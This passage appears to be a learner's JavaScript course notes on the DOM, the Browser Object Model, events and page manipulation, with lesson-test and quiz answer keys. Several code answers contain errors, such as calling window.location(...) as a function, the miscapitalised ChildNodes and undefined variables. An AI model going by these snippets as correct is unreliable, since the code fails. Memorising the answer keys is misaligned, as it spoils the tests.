					wifi_on.src = "images/wifi-on.png";
				}
				function wifiOff()
				{
					var wifi_off = document.getElementById("image");
					wifi_off.src = "images/wifi-off.png";
				}
*/

/*
		The Browser Object Model (BOM):
				BOM.html
				<!DOCTYPE html>
				<html>
				<head>
					<meta charset="utf-8" />
				</head>
				<body>
					<h2>Browser Object Model</h2>
					Click this button - it will load a new document... <br/>
					<button id="newDoc">Load!</button> <br/> <br/>
					Click this button to go back... <br/>
					<button id="goBack">Back!</button>
					<script src="BOM.js"></script>
				</body>
				</html>
				
				BOM.js
				"use strict";
				console.log("Width of the screen: ", screen.width);
				console.log("Height of the screen: ", screen.height);
				console.log("Depth of the color: ", screen.colorDepth);

				console.log("\n\nCurrent page location: ", window.location.href);
				console.log("The protocol used: ", window.location.protocol);

				var newDoc = document.getElementById('newDoc');
				newDoc.onclick = function()
				{
					window.location.assign("https://skillsoft.com/");
				}

				var goBack = document.getElementById('goBack');
				goBack.onclick = function()
				{
					window.history.back();
				}

				console.log("\n\nCheck whether the cookie is enabled or not: ", navigator.cookieEnabled);
				console.log("Version of the browser: ", navigator.appVersion);
				console.log("Platform of the browser: ", navigator.platform);
*/

/*
		The window Object:
				WindowSourceObject.html
				<!DOCTYPE html>
				<html>
				<head>
					<meta charset="utf-8" />
				</head>
				<body>
					<h2>Window Source Object</h2>
					<script src="WindowSourceObject.js"></script>
					Click this button to open a new window <br/>
					<button id="openButton">Open!</button> <br/> <br/>
					Click this button to close the newly opened window <br/>
					<button id="closeButton">Close!</button> <br/> <br/>
					Click this button to view the history object <br/>
					<button id="historyButton">History!</button> <br/> <br/>
					Click this button to navigate to Wikipedia <br/>
					<button id="wikipediaButton">Wikipedia!</button>
					<div id="history"></div>
				</body>
				</html>
				
				WindowSourceObject.js
				"use strict";
				window.onload = function()
				{
					var openButton = document.getElementById('openButton');
					var closeButton = document.getElementById('closeButton');
					var historyButton = document.getElementById('historyButton');
					var wikipediaButton = document.getElementById('wikipediaButton');
					
					var newWindow = null;
					openButton.onclick = function()
					{
						newWindow = window.open("https://skillsoft.com/");
					}
					closeButton.onclick = function()
					{
						if(newWindow != null)
						{
							newWindow.close();
						}
					}
					historyButton.onclick = function()
					{
						var browserHistory = document.getElementById("history");
						browserHistory.innerHTML = "Your browser window history has " + window.history.length + " entries!";
					}
					wikipediaButton.onclick = function()
					{
						window.location("https://wikipedia.org/");
					}
				}
*/

/*
	Test (11 Q's):
	Q1: Which of these invocations will open up the page https://skillsoft.com/ in a new window tab?
			window.open("https://skillsoft.com/");

	Q2: Which of these function calls can you make in order to create a new <p> element to be added to your DOM?
			document.createElement("p");

	Q3: You have a div element and you want to perform an operation when a user clicks inside it and holds down the mouse button.
		Which of these is the attribute of the div element which you should map to an event handler?
			onmousedown

	Q4: Which of these functions can be used to retrieve all div elements on a web page?
			document.getElementsByTagName("div");

	Q5: Which of these properties gives information about the end user's browser?
			navigator.appVersion

	Q6: You have a text box element and you want to perform an operation when a user clicks inside it.
		Which of these is the attribute of the text box which you should map to an event handler?
			onfocus

	Q7: Which of these function calls can you make to execute a function myFunction every 10 seconds?
			setInterval(myFunction, 10000)

	Q8: Which of these function invocations can be used to return all elements matching a given CSS selector?
			document.querySelectorAll("<css_selector>")

	Q9: With an object called myElement referencing a DOM element on your page, which of these attributes give you an array of all the children of the element?
			myElement.childNodes

	Q10: You have an object called myElement for an element on your web page.
		 Which of these commands will set its background color to pink?
			myElement.style.backgroundColor = "pink"

	Q11: You have a new DOM element object called newElement.
		 Which of the following commands can you run to add this to the DOM structure just before another element called myElement?
			document.body.insertBefore(newElement, myElement)
*/

/*
Supplementary Material:
	JavaScript Essentials 7: Working with Page Elements (1h 40m)
		Backgrounds and Buttons:
		Finding HTML Elements by ID:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<style>
					.divPar
					{
						font-family: Arial;
						font-size: 16px;
					}
				</style>
			</head>
			<body>
				<div id="div1">Planes</div>
				<div id="div2">Trains</div>
				<div id="div3">Automobiles</div>
				<div id="div4">Boats</div>
				<script type="text/javascript">
					var content1 = document.getElementById("div1");
					document.write("Text from DIV " + content1.innerHTML + '<br/>');
				</script>
			</body>
			</html>
*/

/*
		Changing a Page Background:
			<head>
				<script type="text/javascript">
					// change the page background to a color other than white
					function colchg()
					{
						document.body.style.background = "#ffff66";
						document.getElementById("bgcol").innerHTML = document.body.style.background;
					}
				</script>
				<script type="text/javascript">
					// change the page background to an image file
					function imgchg()
					{
						document.body.style.backgroundImage	= "url('bg.jpg')";
						document.getElementById("bgimg").innerHTML = document.body.style.backgroundImage;
					}
				</script>
			</head>
			<body>
				Change the color <br/>
				<input name="colbtn" id="colbtn" type="button" value="Change Color" onclick="colchg()" /> <br/>
				Value equals
				<div id="bgcol"></div> <br/>
				Change the background <br/>
				<input name="bkg" id="bkg" type="button" value="Change Background" onclick="imgchg()" /> <br/>
				Value equals
				<div id="bgimg"></div>
			</body>
			</html>
*/

/*
		Navigating to a URL with a Button:
			<input type="button" name="register" id="register" value="Register Now!" onclick="parent.location='registration.html'" />
			<input type="button" name="register" id="register" value="Register Now!" onclick="window.open('registration.html', '_blank')" />
			<input type="button" name="register" id="register" value="Register Now!" onclick="window.open('registration.html', '_self')" />
*/

/*
		Changing the Value of a Button:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
			</head>
			<body>
				Change the value <br/>
				<input name="onoff" id="onoff" type="button" value="Click off" onclick="return swap(this);" /> <br/>
				Value equals
				<div id="feedback"></div>
				<script type="text/javascript">
					function swap(element)
					{
						if(element.value == "Click off")
						{
							element.value = "Click on"
							document.getElementById("feedback").innerHTML = element.value;
						}
					}
				</script>
			</body>
			</html>
*/

/*
		Changing the Properties of a Button:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
			</head>
			<body>
				Change this button:
				<br/>
				<input name="btn" id="btn" type="button"
					   value="Click me" onclick="btnchg()" />
				<br/>
				<script type="text/javascript">
					function btnchg()
					{
						document.getElementById('btn').style.width="300px";
						document.getElementById('btn').style.height="100px";
						// document.getElementById('btn').style.background="#ffff99";
						document.getElementById('btn').style.background='url('img.png')';
					}
				</script>
			</body>
			</html>
*/

/*
	Lesson Test:
	Q1: You want to change the background color of the move button after it's clicked. Which piece of code can you use to do this?
			<input name="move" id="move" type="button" value="Move right" onclick="change()"; /> <br/>
			<script type="text/javascript">
				function change()
				{
					document.getElementById('move').style.background="#6699ff";
				}
			</script>

	Q2: You want to display the contents of div1 in another location. Which piece of code can you use to do this?
			var x = document.getElementById("div1");
			document.write("Text from div1" + x.innerHTML + '<br/>');

	Q3: After the leftRight button is clicked, you want its value to change from "Move right" to "Move left". Complete the onclick attribute to do so.
			<input name="leftRight" id="leftRight" type="button" value="Move right" onclick="return change(this)"; /> <br/>
			<script type="text/javascript">
				function change(element)
				{
					if(element.value == "Move right")
					{
						element.value = "Move left";
					}
				}
			</script>

	Q4: Complete the code to change the color of the page background.
			function change()
			{
				document.body.style.background = "#CCFF66";
			}

	Q5: You want to use a button for navigation to a URL in JavaScript. Which button do you use to do this?
			<input type="button" name="signup" id="signup" value="Sign Up!" onclick="parent.location='signup.html'" />
*/

/*
		Working with DIV Containers:
		Removing a DIV Container using removeChild:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					function removeDiv(btnstate)
					{
						var eDiv = document.getElementById('tempDiv');
						eDiv.parentNode.removeChild(eDiv);
					}
				</script>
				<style>
					#tempDiv
					{
						width: 250px;
						height: 250px;
						background-color: #FF9;
					}
				</style>
			</head>
			<body>
				<div id="container">
					<input name="remdiv" id="remdiv" type="button" value="Remove" onclick="removeDiv(this)" /> <br/>
					<div id="tempDiv"></div>
				</div>
			</body>
			</html>
*/

/*
		Adding a DIV Container using appendChild:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					function removeDiv(btnstate)
					{
						if(btnstate.value == "Remove")
						{
							btnstate.value = "Replace";
							var eDiv = document.getElementById('tempDiv');
							eDiv.parentNode.removeChild(eDiv);
						}
						else
						{
							btnstate.value = "Remove";
							var eDiv = document.createElement('div');
							eDiv.id = "tempDiv";
							document.body.appendChild(eDiv);
						}
					}
				</script>
				<style>
					#tempDiv
					{
						width: 250px;
						height: 250px;
						background-color: #FF9;
					}
				</style>
			</head>
			<body>
				<div id="container">
					<input name="remdiv" id="remdiv" type="button" value="Remove" onclick="removeDiv(this)" /> <br/>
					<div id="tempDiv"></div>
				</div>
			</body>
			</html>
*/

/*
		Adding Content to a DIV:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					function puttext()
					{
						var theDiv = document.getElementById("textbox");
						var content = "A lot of text in here...";
						document.getElementById("textbox").innerHTML = content;
					}
				</script>
			</head>
			<body>
				<div id="textbox" style="width:500px; height:400px;"></div>
				<button id="click" onclick="puttext()">Add Text</button>
			</body>
			</html>
*/

/*
		Adding an Image File to a DIV:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					function showImage()
					{
						var add = document.createElement('img');
						add.src = 'diallonics_logo.png';
						document.getElementById('imageAdd').appendChild(add);
					}
				</script>
			</head>
			<body>
				<div id="imageAdd" style="width:250px; height:150px; background-color:#e2d4d4;"></div>
				<div>
					<a href="javascript:showImage();">Click to see me</a>
				</div>
				<div>
					<a href="javascript:hideImage();">Click to hide me</a>
				</div>
			</body>
			</html>
*/

/*
		Removing an Image File from a DIV:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					function showImage()
					{
						var add = document.createElement('img');
						add.src = 'diallonics_logo.png';
						document.getElementById('imageAdd').appendChild(add);
					}
				</script>
				<script type="text/javascript">
					function hideImage()
					{
						var remove = document.getElementById('imageAdd');
						remove.removeChild(remove.ChildNodes[0]);
					}
				</script>
				<style>
					#imgSize
					{
						width: 250px;
					}
				</style>
			</head>
			<body>
				<div id="imageAdd" style="width:300px; background-color:#abecdc;"></div>
				<div>
					<a href="javascript:showImage();">Now you see me</a>
				</div>
				<div>
					<a href="javascript:hideImage();">Now you don't</a>
				</div>
			</body>
			</html>
*/

/*
	Lesson Test:
	Q1: You want to add an image file to a div with an id of imageAdd. Complete the statement to do so.
			function showImage()
			{
				var add = document.createElement('img');
				add.src = 'diallonics.png';
				document.getElementById('imageAdd').appendChild(add);
			}

	Q2: Complete the code to remove the temp div from the HTML page.
			<script type="text/javascript">
				function removeDiv()
				{
					var eDiv = document.getElementById('temp');
					eDiv.parentNode.removeChild(eDiv);
				}
			</script>
			<style type="text/css">
				#temp
				{
					width: 100px;
					height: 100px;
					background-color: #6699ff;
				}
			</style>
		</head>
		<body>
				<input name="remdiv" id="remdiv" type="button" value="Remove" onclick="removeDiv()" /> <br/>
				<div id="temp"></div>
		</body>

	Q3: Complete the code to add the temp div from the HTML page after it has been removed.
			<script type="text/javascript">
				function removeDiv(btnState)
				{
					if(btnState.value == "Remove")
					{
						btnState.value = "Replace";
						var eDiv = document.getElementById('temp');
						...
					}
					else
					{
						btnState.value = "Remove";
						var eDiv = document.getElementById('div');
						eDiv.id = 'temp';
						document.body.appendChild(eDiv);
					}
				}
			</script>
			<style type="text/css">
				#temp
				{
					width: 100px;
					height: 100px;
					background-color: #6699ff;
				}
			</style>
		</head>
		<body>
				<input name="remdiv" id="remdiv" type="button" value="Remove" onclick="removeDiv(this)" /> <br/>
				<div id="temp"></div>
		</body>

	Q4: Which line of code can you use to remove the first image from a div with the id of imageAdd?
			function hideImage()
			{
				var x = document.getElementById('imageAdd');
				x.removeChild(x.childNodes[0]);
			}

	Q5: You want to add the content of the newText variable to a div with the id of textbox. What can you use to do this?
			function putText()
			{
				var theDiv = document.getElementById("textbox");
				var newText = "some text";
				document.getElementById("textbox").innerHTML = newText;
			}
*/

/*
		HTML Elements:
		Adding List Elements using JavaScript:
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					var listItem = 0;
					function addToList()
					{
						if(listItem >= 4)
						{
							listItem = 0;
						}
						if(listItem == 0)
						{
							var travelmode = "Planes";
						}
						if(listItem == 1)
						{
							var travelmode = "Trains";
						}
						if(listItem == 2)
						{
							var travelmode = "Automobiles";
						}
						if(listItem == 3)
						{
							var travelmode = "Boats";
						}
						listItem++;
						var newnode = document.createElement('li');
						var textnode = document.createTextNode(travelmode);
						newnode.appendChild(textnode);
						document.getElementById("transportation").appendChild(newnode);
					}
				</script>
			</head>
			<body>
				<ul id="transportation"></ul>
				<button onclick="addToList()">Add to List</button>
			</body>
*/

/*
		Removing List Elements using JavaScript:
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					var listItem = 0;
					function addToList()
					{
						if(listItem >= 4)
						{
							listItem = 0;
						}
						if(listItem == 0)
						{
							var travelmode = "Planes";
						}
						if(listItem == 1)
						{
							var travelmode = "Trains";
						}
						if(listItem == 2)
						{
							var travelmode = "Automobiles";
						}
						if(listItem == 3)
						{
							var travelmode = "Boats";
						}
						listItem++;
						var newnode = document.createElement('li');
						var textnode = document.createTextNode(travelmode);
						newnode.appendChild(textnode);
						document.getElementById("transportation").appendChild(newnode);
					}
				</script>
				<script type="text/javascript">
					function removeFromList()
					{
						var list = document.getElementById("transportation");
						list.removeChild(list.childNodes[0]);
					}
				</script>
			</head>
			<body>
				<ul id="transportation"></ul>
				<button onclick="addToList()">Add to List</button>
				<button onclick="removeFromList()">Remove from List</button>
			</body>
*/

/*
		Getting HTML Text from a Page Element:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
			</head>
			<body>
				<div id="div1" style="width:200px; height:150px; background-color:#FF9900;">
					This is text inside DIV 1
				</div>
				<div id="div2" style="width:300px; height:100px; background-color:#009F00;">
					This is text inside DIV 2
				</div>
				<div id="info" style="width:300px; height:100px; background-color:#0ff;">
				</div>
				<script type="text/javascript">
					var a = document.getElementById('div1').innerHTML;
					document.getElementById("info").innerHTML = a;
				</script>
			</body>
			</html>
*/

/*
		Finding and Changing HTML Elements by Class Name:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					function doIt()
					{
						var className = document.getElementsByClassName("class1");
						// alert(className);
						document.getElementById("output").innerHTML	= "Number of Classes " + className[0].className	+ " is " + className.length;
						for(var i = 0; i < className.length; i++)
						{
							className[i].style.backgroundColor = "red";
							className[i].style.font = "20pt Calibri";
							className[i].innerHTML = "class 3";
						}
					}
				</script>
				<style>
					.class1
					{
						font-family: 'Times New Roman';
						font-size: 12px;
						width: 200px;
						height: 75px;
						background-color: #ffd800;
					}
					.class2
					{
						font-family: 'Calibri';
						font-size: 18px;
						width: 200px;
						height: 75px;
						background-color: #b6ff00;
					}				
				</style>
			</head>
			<body>
				<div id="class1" class="class1" style="color:#FFd800;">
					class 1
				</div> <br/>
				<div class="class2">class 2</div> <br/>
				<div class="class1">class 1</div> <br/>
				<div class="class2">class 2</div> <br/>
				<div class="class1">class 2</div> <br/>
				<input type="button" onclick="doIt()" value="GO" />	<br/> <br/>
				<span id="output"></span>
			</body>
			</html>
*/

/*
		Finding and Changing HTML Elements by Tag Name:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					function doIt()
					{
						var tag = document.getElementsByTagName("div");
						alert(tag[0].innerHTML);
						document.getElementById("output").innerHTML	= "Number of elements " + tag[0].tagName + " is " + tag.length;
						for(var i = 0; i < tag.length; i++)
						{
							tag[i].style.backgroundColor = "red";
							tag[i].style.font = "20pt Calibri";
							tag[i].innerHTML = "CHANGED";
						}
					}
				</script>
				<style>
					.class1
					{
						font-family: 'Times New Roman';
						font-size: 12px;
						width: 200px;
						height: 75px;
						background-color: #ff6a00;
					}
					.class2
					{
						font-family: 'Calibri';
						font-size: 18px;
						width: 200px;
						height: 75px;
						background-color: #0094ff;
					}				
				</style>
			</head>
			<body>
				<div id="class1" class="class1" style="color:#FFd800;">
					class 1
				</div> <br/>
				<div class="class1">DIV1</div> <br/>
				<div class="class2">DIV2</div> <br/>
				<div class="class1">DIV3</div> <br/>
				<div class="class2">DIV4</div> <br/>
				<div class="class1">DIV5</div> <br/>
				<input type="button" onclick="doIt()" value="GO" /> <br/> <br/>
				<span id="output"></span>
			</body>
			</html>
*/

/*
		Find, Add, or Change Form Elements:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					function doIt()
					{
						var elem = document.forms[0];
						// alert(elem.length);
						// elem[3].value = "555-555-5555";
						// elem[3].size = "50";
						for(var i = 0; i < elem.length - 1; i++)
						{
							var formData = new Array;
							formData[i] = elem[i].value + "<br/>";
							document.getElementById("output").innerHTML	+= formData[i]; 
						}
					}
				</script>
				<style>
					.class1
					{
						font-family: 'Times New Roman';
						font-size: 12px;
						width: 200px;
						height: 75px;
						background-color: #ff6a00;
					}
					.class2
					{
						font-family: 'Calibri';
						font-size: 18px;
						width: 200px;
						height: 75px;
						background-color: #0094ff;
					}				
				</style>
			</head>
			<body>
				<form name="form1">
					Name: <input type="text" id="name" /> <br/> <br/>
					Address: <input type="text" id="name" /> <br/> <br/>
					Email: <input type="text" id="name" /> <br/> <br/>
					Phone: <input type="text" id="name" /> <br/> <br/>
					<input type="button" onclick="doIt()" value="GO" />	<br/> <br/>
				</form>
				<span id="output"></span>
			</body>
			</html>
*/

/*
		Adding HTML Elements using document.createElement:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					function doIt()
					{
						var btn = document.createElement("button");
						btn.innerHTML = "New";
						document.body.appendChild(document.createElement('br'));
						document.body.appendChild(btn);
						var forms = new Array;
						for(var i = 0; i < 5; i++)
						{
							document.body.appendChild(document.createElement('br'));
							forms[i] = document.createElement("input");
							forms[i].type = "text";
							forms[i].value = "form field " + i;
							document.body.appendChild(forms[i]);
						}
					}
				</script>
				<style>
					.class1
					{
						font-family: 'Times New Roman';
						font-size: 12px;
						width: 200px;
						height: 75px;
						background-color: #ff6a00;
					}
					.class2
					{
						font-family: 'Calibri';
						font-size: 18px;
						width: 200px;
						height: 75px;
						background-color: #0094ff;
					}				
				</style>
			</head>
			<body>
				<form name="form1">
					Name: <input type="text" id="name" /> <br/> <br/>
					Address: <input type="text" id="name" /> <br/> <br/>
					Email: <input type="text" id="name" /> <br/> <br/>
					Phone: <input type="text" id="name" /> <br/> <br/>
					<input type="button" onclick="doIt()" value="GO" /> <br/> <br/>
				</form>
				<span id="output"></span>
			</body>
			</html>
*/

/*
	Lesson Test:
	Q1: Which piece of code can you use to add HTML elements to a web page?
			var para = document.createElement("p");
			p.innerHTML = "some text";

	Q2: You want to change the styles used in several elements that share the same class, blue.
		Complete the code to select those elements by assigning them to variable x.
			function change()
			{
				var x = document.getElementsByClassName("blue");
			}

	Q3: You want to manipulate HTML form elements using JavaScript. Complete the code to assign elements of the first HTML form to variable y.
			function change()
			{
				var y = document.forms[0];
			}

	Q4: You want to make a change to the style of all paragraph (p) elements on a page. Which method can you use to select the p element?
			getElementsByTagName

	Q5: You want to add list elements to an unordered list with the id of movies. Which method can you use to complete the code to do so?
			var listItem = 0;
				function addToList()
				{
					if(listItem >= 4)
					{
						listItem = 0;
					}
					if(listItem == 0)
					{
						var genre = "Comedy";
					}
					listItem++;
					var newnode = document.createElement('li');
					var textnode = document.createTextNode(travelmode);
					newnode.appendChild(textnode);
					document.getElementById("movies").appendChild(newnode);
				}

	Q6: Complete the code to remove the first item from a list with id of list1.
			function del()
			{
				var a = document.getElementById("list1");
				a.removeChild(a.ChildNodes[0]);
			}

	Q7: Complete the code to display the HTML text from a div with id of div1 in a div with id of div2.
				var x = document.getElementById("div1").innerHTML;
				document.getElementById("div2").innerHTML = x;
*/

/*
		Page Manipulation:
		Selecting Files and Create Image Thumbnails:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					var counter = 1;
					function selectFile(event)
					{
						var selFile = event.target.files[0];
						var readFile = new FileReader();
						var container = "image" + counter;
						var imgLoc = document.getElementById(container);
						imgLoc.title = selFile.name;
						readFile.onload = function(event)
						{
							imgLoc.src = event.target.result;
							readFile.readAsDataURL(selFile);
							counter++;
						}
					}
				</script>
			</head>
			<body>
				Input File:
				<input type="file" onchange="selectFile(event)" /> <br/>
				<div>
					<img id="image1" width="100" />
					<img id="image2" width="100" />
					<img id="image3" width="100" />
					<img id="image4" width="100" />
					<img id="image5" width="100" />
				</div>
			</body>
			</html>
*/

/*
		Capturing Data from a Form Field in Real Time:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					function iceCream(icecream)
					{
						document.getElementById("showme").value = icecream;
					}
				</script>
			</head>
			<body>
				My favourite ice cream flavor is: <br/>
				<input type="text" id="showme" /> <br/>
				<input type="submit" value="Submit" />
				<p>
					Select your favorite ice cream:
				</p>
				<form action="form_submit.php">
					<input type="radio" name="icecream" onclick="iceCream(this.value)" value="Vanilla" />
					 Vanilla <br/>
					<input type="radio" name="icecream" onclick="iceCream(this.value)" value="Chocolate" />
					 Chocolate <br/>
					<input type="radio" name="icecream" onclick="iceCream(this.value)" value="Strawberry" />
					 Strawberry <br/>
					<input type="radio" name="icecream" onclick="iceCream(this.value)" value="Neopolitan" />
					 Neopolitan <br/>
					<input type="radio" name="icecream" onclick="iceCream(this.value)" value="Rocky Road" />
					 Rocky Road <br/> <br/>
				</form>
			</body>
			</html>
*/

/*
		Creating an Automated Redirect:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					setInterval(function() { countDown(); }, 1000);
					function countDown()
					{
						var count = document.getElementById("counter");
						if(parseInt(count.innerHTML) <= 0)
						{
							location.href = "homepage.html";
						}
						count.innerHTML = parseInt(count.innerHTML) - 1;
					}
				</script>
			</head>
			<body>
				Redirect in <span id="counter">10</span> second(s)
			</body>
			</html>
*/

/*
		Creating a Countdown Timer:
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="utf-8" />
				<title>JavaScript</title>
				<script type="text/javascript">
					setInterval('howManySleeps()', 1000);
					function howManySleeps()
					{
						thePresent = new Date();
						christmas = Date.parse("December 24, 2022 17:00:00");
						daysLeft = christmas - thePresent;
						days = Math.floor(daysLeft / (1000 * 60 * 60 * 24));
						hours = Math.floor(daysLeft / (1000 * 60 * 60));
						mins = Math.floor(daysLeft / (1000 * 60));
						secs = Math.floor(daysLeft / (1000));
						dd = days;
						hh = hours - days * 24;
						mm = mins - hours * 60;
						ss = secs - mins * 60;
						document.getElementById("Countdown").innerHTML = dd + ' days ' + hh + ' hours ' + mm + ' minutes ' + ss + ' seconds';
					}
				</script>
			</head>
			<body>
				<div style="text-align:center; vertical-align:middle; width:300px; height:50px; border:2px solid; line-height:24px; font-family:Arial;">
					Shopping days until Christmas: <br/>
					<div id="Countdown"></div>
				</div>
			</body>
			</html>
*/

/*
	Lesson Test:
	Q1: As soon as the user clicks a radio button, the choice should be displayed in the text box. Complete the statement to do so.
			<script type="text/javascript">
				function Genre(x)
				{
					document.getElementById("showme").value = x;
				}
			</script>
		</head>
		<body>
			My favourite movie genre is: <br/>
			<input type="text" id="showme" /> <br/>
			<input type="submit" value="Submit" />
			<p>
				Select your favorite movie genre:
			</p>
			<form action="form_submit.php">
				<input type="radio" name="genre" onclick="Genre(this.value)" value="Comedy" />
					Comedy <br/>
				<input type="radio" name="genre" onclick="Genre(this.value)" value="Action" />
					Action <br/>
				<input type="radio" name="genre" onclick="Genre(this.value)" value="Romance" />
					Romance <br/>
			</form>
		</body>

	Q2: You want to use a span to count down from 10 seconds to 0 seconds and then automatically redirect the user to another site with JavaScript.
		You use the parseInt function to decrement the number 10 in	the span by one. Which other steps do you need to take?
			<body>
				Redirect in <span id="counter">10</span> second(s)
			</body>
				Reference the span by its id attribute.
				Set the location.href property to the new site.
				Specify the countdown interval in milliseconds.
				Use the parseInt function to check whether the innerHTML of the span is 0 or less.

	Q3: Which steps are involved in using JavaScript to select files and create thumbnails on a web page?
			Use the HTML5 FileReader API.
			Create img tags with an id and width.
			Create a container variable to locate the appropriate img tag.

	Q4: Which steps are involved in using JavaScript to create a countdown timer?
			Use Date.parse on the date you're counting down to, and assign the result to a variable.
			Specify the countdown interval in milliseconds.
			Set the innerHTML of the appropriate HTML element to display the countdown values.
			Create a new Date object for the current date.
			Use the Math object to calculate the days, hours, minutes, and seconds.
*/

/*
Quiz:
Q1: Complete the DOM:
		Window
		Document
		<html>
	<head>	<body>
		A webpage is a document.
		The DOM represents the document as nodes and objects.
		The <html> tag represents the root of a HTML document, and it is the container for all other HTML elements (with the exception of the <!DOCTYPE> tag).
		The <head> tag is a container for all the head elements.
		The <body> tag defines the document's body.

Q2: Complete the DOM:
						Window
						Document
						<html>
			<head>					<body>
	<meta><title><link>			<section><header>
		The <link> element is used to link to external style sheets, and can only be placed in the <head> tag.
		The <header> element represents a container for introductory content, or a set of navigational links.
		Elements included within the opening and closing <body> tags will be displayed on the web page.
		Elements included within the opening and closing <head> tags will not be visible on the web page.

Q3: When the button is pressed, you wish to display an alert box.
		<body>
			<button type="button" onclick="alert("Button clicked!");">
				Click for message
			</button>
		</body>
			The HTML event, onclick, occurs when the user clicks on a button.

Q4: I want to display the number of paragraph elements contained in a webpage.
		<!DOCTYPE html>
		<html>
		<body>
			 <p>JavaScript is a language that I enjoy learning!</p>
			 <p>CSS is a scripting language that I would like to learn also!</p>
			 <p>HTML5 is next on my list though...!</p>

			 <button onclick="f1()">Press</button>
			 <script>
				function f1()
				{
				   var paragraphList = document.getElementsByTagName("p");
				   var noOfParagraphs = paragraphList.length;
				   document.write("There are " + noOfParagraphs + " paragraph elements.");
				}
			 </script>
		</body>
		</html>
			The document.getElementsByTagName() method returns a HTMLCollection of elements to match the given tag name.

Q5: You wish to display an alert box when a value is input (and the Enter key is then pressed).
		<!DOCTYPE html>
		<html>
		<body>
			Bill:
			<input type="number" onchange="myFunction()" value=0 /> <br/>
			<script>
				  function myFunction()
				  {
					alert("Amount entered!");
				  }
		   </script>
		</body>
		</html>
			The onchange event occurs when the value of an element has been changed.

Q6: You have been asked to create a webpage that calculates the net (sale) price of a product.
	The net price is the manufacturer's price plus the tax.
		<!DOCTYPE html>
		<html>
		<head>
			<title>JavaScript Practice</title>
			<script type = "text/javascript">
				function compute_total()
				{
					var value = document.getElementById("price").value;
					// Assume the vat rate is 10%.
					total = 1.10 * value;
					total = total.toFixed(2);

					var total_slot = document.getElementById("total");
					total_slot.innerHTML = total;
				}
			</script>
		</head>
		<body>
			<form>
				Manufacturer's price:
				<input type = "number" id = "price" oninput = "compute_total();" />
				The net price, (manufacturer's price including tax), is:
				<span id = "total"></span>
			</form>
		</body>
		</html>
			The getElementById() method of the Document object allows us to access the value associated with a HTML element.
			The innerHTML property sets or returns the HTML content	of an element.

Q7: When the Press button is submitted, I want the header element to no longer be visible.
		<!DOCTYPE html>
		<html>
		<body>
			<h1>Learning JavaScript is fun and rewarding!</h1>
			<button onclick="hideHeader()">Press</button>
			<script>
				function hideHeader()
				{
				   document.getElementsByTagName("h1")[0].setAttribute("hidden", "true");
				}
			</script>
		</body>
		</html>
			The setAttribute() method adds the specified attribute to an element, and assigns it the specified value.
			The getElementsByTagName method returns an array of the specified element type, (h1).
			To access the first (and only) h1 element in the web page, we use the array syntax [0], element 0 of the array.
			hidden is a HTML global attribute (global attributes can be used on	any HTML element).

Q8: You are writing a JavaScript function which, when called, should open a new window showing the Microsoft.com homepage.
		function openExamInfoWindow()
		{
			var examInfoWindow = window.open("https://www.microsoft.com", "", "width=400,height=800" false);
		}
			The window.open() method opens a new browser window.
			The syntax reads:
				window.open(URL, name, specs, replace):
					URL (Optional): Specifies the URL of the page to open.
					name (Optional): Specifies the target attribute or the name of the window.
					specs (Optional): A comma-separated list of items such as height and width.
					replace (Optional): Specifies whether the URL creates a new entry, or replaces the current entry in the history list.

Q9: You wish to call myFunction() when the webpage has been fully loaded.
		<script>
			function myFunction()
			{
				var canvas = document.getElementById("smallRectangle");
				context = canvas.getContext("2d");
				context.fillStyle = "yellow";
				context.fillRect(15, 25, 200, 100);
			}
		</script>
		<body onload="myFunction();">
			<canvas id="smallRectangle" height='300' width='500'> </canvas>
		</body>
			To execute a JavaScript function immediately after a page has been loaded, we can use the HTML event, onload.

Q10: In the JavaScript function, myFunction(), you wish to refer to the HTML element with the ID attribute "smallRectangle".
		<script>
			function myFunction()
			{
				var canvas = document.getElementById("smallRectangle");
				context = canvas.getContext("2d");
				context.fillStyle = "yellow";
				context.fillRect(15, 25, 200, 100);
			}
		</script>
		<body onload="myFunction();">
			<canvas id="smallRectangle" height='300' width='500'> </canvas>
		</body>
			The document.getElementById() method returns the element of a specified ID.

Q11: When the mouse hovers over the above image, an alert box with the text 'Hello eCollege!' should be displayed.
		<!DOCTYPE html>
		<html>
		<body>
			<img onmouseover=alert("Hello eCollege!") border="0" src="ecollege_logo.png" alt="eCollege logo" width="25" height="25" />
		</body>
		</html>
